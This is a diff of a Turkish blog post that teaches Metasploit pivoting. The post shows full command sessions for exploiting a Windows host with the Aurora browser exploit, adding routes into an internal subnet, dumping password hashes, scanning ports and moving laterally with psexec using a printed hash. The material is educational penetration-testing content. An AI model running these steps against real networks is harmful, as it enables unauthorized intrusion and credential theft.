@@ -1,20 +1,19 @@
 ---
 draft: false
-
-title:  'MSF Pivoting'
-date: '2017-06-05T13:33:00+03:00'
+title: MSF Pivoting
+linkTitle: MSF Pivoting
+translationKey: msf-pivoting
+weight: 310
+date: 2017-06-05T13:33:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  "Bir sistemde meterpreter shell oturumu açtığınızı varsayalım. Oturum açtığınız sistem, ağda bulunan ancak tam yetkili bir bilgisayar olmayabilir. Bu ilk oturum açtığınız sistemi bir sıçrama tahtası olarak kullanıp aynı ağdaki diğer bilgisayarlara erişmeye\_pivoting\_adı verilmektedir. Başka bir terminolojide\_kıyı başı\_veya\_giriş noktası\_olarak isimlendirildiğine de rast gelebilirsiniz." 
- 
-url:  /tr/msf-pivoting/
- 
+description: İlk oturum açtığınız sistemi bir sıçrama tahtası olarak kullanıp aynı ağdaki diğer bilgisayarlara erişmeye pivoting adı verilmektedir.
+url: /tr/msf-pivoting/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+   - Metasploit Framework
 tags:
-    - cybersecurity
-    - 'metasploit framework'
+   - cybersecurity
+   - metasploit framework
 ---
 ## Pivoting Nedir?
 
@@ -25,6 +24,7 @@ Normalde doğrudan erişimi bulunmayan sunucu veya ağ sistemlerine, pivoting ku
 ## 1.Bilgisayara Shell Açalım
 
 Burada kullanılan `exploit/windows/browser/ms10_002_aurora` modülü sayesinde, hazırlanan zararlı bir linke tıklayan şirket çalışanının bilgisayarında oturum açılmaktadır.
+
 ```bash
 msf > use exploit/windows/browser/ms10_002_aurora 
 msf exploit(ms10_002_aurora) > show options
@@ -60,6 +60,7 @@ msf exploit(ms10_002_aurora) >
 ```
 
 Açılan yeni oturumu `sessions -l` komutuyla görebilirsiniz. Aşağıdaki listede kendi IP adresimizden `LHOST: 192.168.1.101` diğer hedef bilgisayara `RHOST:192.168.1.201` bağlantı kurulduğu görülmektedir.
+
 ```bash
 msf exploit(ms10_002_aurora) > 
 > Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
@@ -81,6 +82,7 @@ msf exploit(ms10_002_aurora) >
 ## 1.Bilgisayarın Ağ Kartları
 
 Şimdi bu oturuma girelim ve `ipconfig` komutuyla hedef bilgisayarın ağ ayarlarına bakalım.
+
 ```bash
 msf exploit(ms10_002_aurora) > sessions -i 1
 > Starting interaction with 1...
@@ -115,6 +117,7 @@ Oysa sistemde
 isimli 2 kart daha var. Bunlardan `MS TCP Loopback interface` isimli arayüz, zaten `localhost` olarak kullanılan iletişim aracıdır.
 
 O zaman, `Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport` isimli diğer ağ yapılandırmasına odaklanalım.
+
 ```bash
 Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
 Hardware MAC: d2:d6:70:fa:de:65
@@ -125,6 +128,7 @@ Netmask     : 255.255.255.0
 Bu bilgilerden anladığımız kadarıyla `Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport` isimli kartın IP adresi `10.1.13.3`. O zaman bu ağa bağlananlara `10.1.13.1-255` aralığında IP adresleri verildiğini anlıyoruz. CIDR formatında bu `10.1.13.0/24` olarak gösteriliyor.
 
 Meterpreter’in sağladığı imkanlardan bir tanesi de `autoroute` script kodudur. autoroute hakkında yardımı görüntüleyelim.
+
 ```bash
 meterpreter > run autoroute -h
 > Usage:   run autoroute [-r] -s subnet -n netmask
@@ -138,6 +142,7 @@ meterpreter > run autoroute -h
 ```
 
 Şimdi otomatik rotalama yapalım. Bunun için aşağıdaki komutu kullanıyoruz.
+
 ```bash
 meterpreter > run autoroute -s 10.1.13.0/24
 > Adding a route to 10.1.13.0/255.255.255.0...
@@ -146,6 +151,7 @@ meterpreter > run autoroute -s 10.1.13.0/24
 ```
 
 Rotalama yapıldı. Kontrol edelim.
+
 ```bash
 meterpreter > run autoroute -p
 
@@ -161,9 +167,10 @@ meterpreter >
 
 ## 2.Bilgisayara Bağlantı
 
-İlk bilgisayarda `getsystem` komutuyla hash bilgilerini elde edelim. Bu hash bilgilerini kullanarak 2. bilgisayara bağlanmaya çalışacağız. Ağdaki bilgisayarların, hash değerleriyle yetki kontrolü yaptığını hatırlayın. Bu teknikle ilgili <a href="https://siberoloji.github.io/metaspliot-framework-yetki-yukseltme/">Metasploit Framework Yetki Yükseltme</a> yazısına bakabilirsiniz.
+İlk bilgisayarda `getsystem` komutuyla hash bilgilerini elde edelim. Bu hash bilgilerini kullanarak 2. bilgisayara bağlanmaya çalışacağız. Ağdaki bilgisayarların, hash değerleriyle yetki kontrolü yaptığını hatırlayın. Bu teknikle ilgili [Yetki Yükseltme](/tr/msf-yetki-yukseltme/) Metasploit Framework Yetki Yükseltme</a> yazısına bakabilirsiniz.
 
 Aşağıdaki komutlarla, `getsystem` ile SYSTEM bilgilerini elde ediyoruz, `hashdump` ile hash bilgilerini alıyoruz ve `CTRL+Z` tuşları ile oturumu arka plana gönderiyoruz.
+
 ```bash
 meterpreter > getsystem
 ...got system (via technique 1).
@@ -187,6 +194,7 @@ msf exploit(ms10_002_aurora) >
 ## 2.Bilgisayar Ağını Tarama
 
 Rotalama sayesinde artık 2. bilgisayar ağı ile haberleşebiliyoruz. O zaman bu ağı tarayalım ve `139` ile `445` numaralı portları açık olup olmadığına bakalım. İsterseniz tüm portları da tarayabilirsiniz. Biz sadece örnek vermek için bu iki portu tarayacağız. Bu tarama işlemi için `auxiliary/scanner/portscan/tcp` modülünü kullanacağız. Modülde RHOSTS değişkenini `RHOSTS 10.1.13.0/24` olarak ayarladığımıza dikkat edin.
+
 ```bash
 msf exploit(ms10_002_aurora) > use auxiliary/scanner/portscan/tcp 
 msf auxiliary(tcp) > show options
@@ -228,6 +236,7 @@ Yapılan tarama sonucunda `10.1.13.2` ve `10.1.13.3` olarak 2 IP adresi bulduk. 
 ## Bağlantı Yapalım
 
 445 numaralı portun `samba` ağ paylaşım işlemlerinden kullanıldığını biliyoruz. Öyleyse, `exploit/windows/smb/psexec` modülünü kullanabiliriz. Modül ayarlarını yaparken, ilk bilgisayardan elde ettiğimiz `Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d` hash değerlerini girdiğimize dikkat edin.
+
 ```bash
 msf auxiliary(tcp) > use exploit/windows/smb/psexec 
 msf exploit(psexec) > show options
@@ -290,6 +299,7 @@ Gördüğünüz gibi 2. bilgisayara bağlantı sağladık. Bu bağlantıyı yuka
 10.1.13.2: Erişim sağlanan 2. bilgisayar.
 
 İkinci bilgisayarın `ipconfig` ayarlarına bakalım.
+
 ```bash
 meterpreter > ipconfig
 
